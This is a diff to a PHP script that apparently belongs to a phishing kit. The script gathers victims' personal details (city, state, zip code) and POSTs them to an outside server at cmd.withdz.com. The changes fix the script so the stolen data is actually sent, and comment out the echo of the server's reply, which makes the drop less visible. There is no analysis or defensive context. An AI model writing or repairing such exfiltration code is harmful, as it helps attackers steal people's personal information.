@@ -88,7 +88,7 @@ city : $city
 state : $state
 zip code : $postal_code";
 
-echo " $data //";
+echo "$data";
 
 
 
@@ -111,7 +111,7 @@ echo " $data //";
 
 $postdata = http_build_query(
     array(
-        'data' => $postdata
+        'data' => $data
     )
 );
 
@@ -131,7 +131,7 @@ $context  = stream_context_create($opts);
 
 $result = file_get_contents('http://cmd.withdz.com/ok/dz.php', false, $context);
 
-echo "ok = $result";
+//echo "ok = $result";
 
 
 ?>
